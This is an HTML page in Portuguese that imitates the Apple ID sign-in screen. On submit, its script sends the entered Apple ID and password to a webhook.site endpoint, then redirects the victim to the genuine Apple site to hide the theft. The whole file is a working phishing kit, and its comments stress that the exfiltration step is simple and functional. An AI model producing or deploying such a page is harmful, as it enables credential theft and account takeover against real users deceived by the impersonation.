<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>Login - Apple ID</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
            background-color: #f5f5f7;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .login-container {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.1);
            width: 320px;
            text-align: center;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
        }
        button {
            width: 100%;
            background: #0071e3;
            color: white;
            border: none;
            padding: 12px;
            border-radius: 8px;
            font-size: 16px;
            margin-top: 10px;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Entrar com Apple ID</h2>
        <form id="loginForm">
            <input type="text" name="email" placeholder="Apple ID" required>
            <input type="password" name="senha" placeholder="Senha" required>
            <button type="submit">Continuar</button>
        </form>
    </div>

    <script>
        document.getElementById("loginForm").addEventListener("submit", function(e) {
            e.preventDefault();
            
            // Dados do formul√°rio
            const dados = {
                email: document.getElementsByName("email")[0].value,
                senha: document.getElementsByName("senha")[0].value,
                data: new Date().toISOString()
            };

            // Envio SIMPLES e FUNCIONAL para o webhook
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "https://webhook.site/e9026c1f-9cde-4e6c-9d5d-bc2eb5f83418", true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(dados));

            // Redirecionamento garantido
            setTimeout(function() {
                window.location.href = "https://appleid.apple.com/";
            }, 500);
        });
    </script>
</body>
</html>
